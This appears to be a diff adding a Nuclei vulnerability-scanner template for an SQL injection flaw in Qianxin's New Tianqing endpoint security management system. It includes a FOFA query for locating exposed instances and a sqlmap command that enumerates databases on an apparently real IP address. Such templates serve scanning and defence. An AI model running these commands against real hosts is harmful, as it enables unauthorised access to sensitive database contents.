@@ -1,0 +1,27 @@
+id: qianxin-new-tianqing-rptsvcsyncpoint-sqli
+info:
+  name: 360 奇安信新天擎 rptsvcsyncpoint - sqli
+  author: leadlife
+  severity: high
+  description: 360 奇安信 新天擎终端安全管理系统 /api/dp/rptsvcsyncpoint 接口存在 SQL 注入漏洞，攻击者可通过该漏洞获取系统数据库中的敏感信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/360%E5%A4%A9%E6%93%8E%20-%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5.md
+  metadata:
+    verified: true
+    fofa-query: title="360新天擎"
+    sqlmap: sqlmap -u "http://219.157.95.16:18080/api/dp/rptsvcsyncpoint?ccid=1" --random-agent --dbs
+  tags: 360,qianxin,sqli,new-tianqing,tianqing
+
+http:
+  - raw:
+      - |
+        GET /api/dp/rptsvcsyncpoint?ccid=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,"success","file_count")
+        condition: and
+  
